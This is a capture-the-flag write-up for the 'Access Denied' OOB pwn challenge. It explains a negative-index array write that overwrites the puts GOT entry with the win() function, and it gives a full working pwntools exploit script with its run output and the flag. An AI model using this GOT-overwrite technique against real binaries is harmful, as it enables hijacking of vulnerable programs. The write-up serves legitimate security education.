# Access Denied: Pwn/OOB

## Question 

I only have an array here

server: nc 34.71.207.70 1337

[oob](oob)

## Solution

The program has an ``out of bounds`` vulnerability because we can index negative values in the array. This allows us to write to memory outside the array, in this case, we'lL overwrite the ``got['puts']`` entry with the addess of the ``win()`` function.

```python
offset=(e.got['puts']-e.sym['arr'])/4
```

Putting our script together:

```python
from pwn import *
import sys

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break *0x4012c4
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('34.71.207.70',1337)
    else:
        return process(e.path,level="error")


offset=(e.got['puts']-e.sym['arr'])/4

p = start()
p.recvuntil(b'Enter the index:') 
p.sendline(b'%i' %offset)
p.recvuntil(b'Enter the value:')
p.sendline(b"%i" %e.sym['win'])
p.interactive()


```

Running our script yields the flag 

```
$ python3 pwn-oob.py BIN=./oob REMOTE
[*] '/root/workspace/access_denied/oob/oob'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './oob'
[+] Opening connection to 34.71.207.70 on port 1337: Done
[*] Switching to interactive mode
 accessdenied{00b_4r3_v3ry_us3ful_r1ght_54a4ce45}
[*] Got EOF while reading in interactive
```

